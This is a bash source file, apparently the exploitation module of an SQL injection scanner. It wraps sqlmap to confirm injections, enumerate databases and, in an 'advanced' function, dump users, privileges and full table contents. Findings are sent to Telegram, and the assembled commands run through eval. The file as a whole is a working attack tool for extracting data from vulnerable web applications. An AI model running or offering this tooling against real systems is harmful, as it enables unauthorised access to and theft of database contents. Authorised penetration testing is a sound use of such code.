#!/bin/bash
# SQLInjectionScanner Exploitation Module - SQLmap integration for exploitation
# This file contains functions for exploiting SQL injection vulnerabilities with SQLmap

# Source the core module
# shellcheck source=sqli_core.sh
. "./sqli_core.sh"

# ------------------------ SQLmap Integration Functions ------------------------

# Run SQLmap on a specific URL with a vulnerable parameter
run_sqlmap_on_vuln() {
  local vuln_url="$1"
  local param_name="$2"
  local tamper_techniques="$3"
  local output_file="${OUTPUT_DIR}/sqlmap_${param_name}_$(date '+%Y%m%d%H%M%S').txt"
  
  log "INFO" "Running SQLmap on ${vuln_url} (parameter: ${param_name})"
  
  # Build SQLmap command
  local sqlmap_cmd="sqlmap -u \"${vuln_url}\" -p \"${param_name}\" --batch --level 5 --risk 3 --banner --dbs"
  
  # Add tamper if specified
  if [[ -n "$tamper_techniques" ]]; then
    sqlmap_cmd="${sqlmap_cmd} --tamper=\"${tamper_techniques}\""
  fi
  
  # Add proxy if specified
  if $USE_PROXY; then
    local proxy_to_use=$(get_proxy)
    if [[ -n "$proxy_to_use" ]]; then
      sqlmap_cmd="${sqlmap_cmd} --proxy=\"${proxy_to_use}\""
    fi
  fi
  
  # Add cookies if specified
  if [[ -n "$COOKIE" ]]; then
    sqlmap_cmd="${sqlmap_cmd} --cookie=\"${COOKIE}\""
  fi
  
  # Add custom headers
  if [[ -n "$CUSTOM_HEADERS" && -f "$CUSTOM_HEADERS" ]]; then
    while IFS= read -r header; do
      header_name="${header%%:*}"
      header_value="${header#*: }"
      sqlmap_cmd="${sqlmap_cmd} --headers=\"${header_name}: ${header_value}\""
    done < "$CUSTOM_HEADERS"
  fi
  
  # Add threads
  sqlmap_cmd="${sqlmap_cmd} --threads=$THREADS"
  
  # Set verbosity
  if $VERBOSE; then
    sqlmap_cmd="${sqlmap_cmd} -v 3"
  else
    sqlmap_cmd="${sqlmap_cmd} -v 1"
  fi
  
  # Set timeout
  sqlmap_cmd="${sqlmap_cmd} --timeout=${TIMEOUT}"
  
  # Add advanced options based on detected vulnerability
  if cat "${OUTPUT_DIR}/vulnerabilities.txt" | grep -q "\[$param_name\] - Time_Based"; then
    sqlmap_cmd="${sqlmap_cmd} --technique=T"
  elif cat "${OUTPUT_DIR}/vulnerabilities.txt" | grep -q "\[$param_name\] - Boolean_Based"; then
    sqlmap_cmd="${sqlmap_cmd} --technique=B"
  elif cat "${OUTPUT_DIR}/vulnerabilities.txt" | grep -q "\[$param_name\] - Error_Based"; then
    sqlmap_cmd="${sqlmap_cmd} --technique=E"
  elif cat "${OUTPUT_DIR}/vulnerabilities.txt" | grep -q "\[$param_name\] - Union_Based"; then
    sqlmap_cmd="${sqlmap_cmd} --technique=U"
  fi
  
  # Set output directory
  sqlmap_cmd="${sqlmap_cmd} -o --output-dir=\"${OUTPUT_DIR}/sqlmap\""
  
  # Create directory for SQLmap output
  mkdir -p "${OUTPUT_DIR}/sqlmap"
  
  # Run SQLmap and save output
  log "INFO" "Executing: $sqlmap_cmd"
  eval "$sqlmap_cmd | tee \"${output_file}\""
  
  # Check if SQLmap found anything
  if grep -q "sqlmap identified the following injection point" "${output_file}"; then
    log "SUCCESS" "SQLmap confirmed vulnerability in ${vuln_url} (param ${param_name})"
    send_telegram "‚úÖ SQLmap confirmed vulnerability in ${vuln_url} (param ${param_name})"
    
    # Extract database info if available
    if grep -q "available databases" "${output_file}"; then
      dbs=$(grep -A 10 "available databases" "${output_file}" | grep -v "available databases" | grep -v "^$" | sed -e 's/\[//' -e 's/\]//' -e 's/\*//g' | tr -d ' ' | head -10)
      send_telegram "üìä Databases found: ${dbs}"
    fi
    
    return 0
  else
    log "INFO" "SQLmap could not confirm vulnerability in ${vuln_url} (param ${param_name})"
    return 1
  fi
}

# Run advanced exploitation with SQLmap
run_advanced_exploitation() {
  local vuln_url="$1"
  local param_name="$2"
  local tamper_techniques="$3"
  local output_file="${OUTPUT_DIR}/sqlmap_advanced_${param_name}_$(date '+%Y%m%d%H%M%S').txt"
  
  log "INFO" "Running advanced SQLmap exploitation on ${vuln_url} (parameter: ${param_name})"
  
  # Ask for user confirmation
  read -r -p "Do you want to attempt advanced exploitation on ${vuln_url}? (y/N): " confirm
  if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
    log "INFO" "Advanced exploitation aborted by user."
    return 1
  fi
  
  # Build advanced SQLmap command
  local sqlmap_cmd="sqlmap -u \"${vuln_url}\" -p \"${param_name}\" --batch --level 5 --risk 3"
  
  # Add tamper if specified
  if [[ -n "$tamper_techniques" ]]; then
    sqlmap_cmd="${sqlmap_cmd} --tamper=\"${tamper_techniques}\""
  fi
  
  # Add advanced options
  sqlmap_cmd="${sqlmap_cmd} --current-user --current-db --is-dba --dump"
  
  # If database management system is known, add specific options
  if grep -q "MySQL" "${OUTPUT_DIR}/sqlmap_${param_name}"*.txt 2>/dev/null; then
    sqlmap_cmd="${sqlmap_cmd} --dbms=MySQL"
  elif grep -q "Microsoft SQL Server" "${OUTPUT_DIR}/sqlmap_${param_name}"*.txt 2>/dev/null; then
    sqlmap_cmd="${sqlmap_cmd} --dbms=MSSQL"
  elif grep -q "Oracle" "${OUTPUT_DIR}/sqlmap_${param_name}"*.txt 2>/dev/null; then
    sqlmap_cmd="${sqlmap_cmd} --dbms=Oracle"
  elif grep -q "PostgreSQL" "${OUTPUT_DIR}/sqlmap_${param_name}"*.txt 2>/dev/null; then
    sqlmap_cmd="${sqlmap_cmd} --dbms=PostgreSQL"
  elif grep -q "SQLite" "${OUTPUT_DIR}/sqlmap_${param_name}"*.txt 2>/dev/null; then
    sqlmap_cmd="${sqlmap_cmd} --dbms=SQLite"
  fi
  
  # Add proxy, cookies, headers, etc.
  # (Similar to run_sqlmap_on_vuln function)
  if $USE_PROXY; then
    local proxy_to_use=$(get_proxy)
    if [[ -n "$proxy_to_use" ]]; then
      sqlmap_cmd="${sqlmap_cmd} --proxy=\"${proxy_to_use}\""
    fi
  fi
  
  if [[ -n "$COOKIE" ]]; then
    sqlmap_cmd="${sqlmap_cmd} --cookie=\"${COOKIE}\""
  fi
  
  # Add threads and verbosity
  sqlmap_cmd="${sqlmap_cmd} --threads=$THREADS"
  
  if $VERBOSE; then
    sqlmap_cmd="${sqlmap_cmd} -v 3"
  else
    sqlmap_cmd="${sqlmap_cmd} -v 1"
  fi
  
  # Set output directory
  sqlmap_cmd="${sqlmap_cmd} -o --output-dir=\"${OUTPUT_DIR}/sqlmap\""
  
  # Run SQLmap advanced exploitation
  log "INFO" "Executing: $sqlmap_cmd"
  eval "$sqlmap_cmd | tee \"${output_file}\""
  
  log "INFO" "Advanced exploitation completed. Check ${output_file} for details."
  send_telegram "üîç Advanced exploitation completed on ${vuln_url} (param ${param_name}). Check results."
  
  return 0
}

# Export functions
export -f run_sqlmap_on_vuln
export -f run_advanced_exploitation 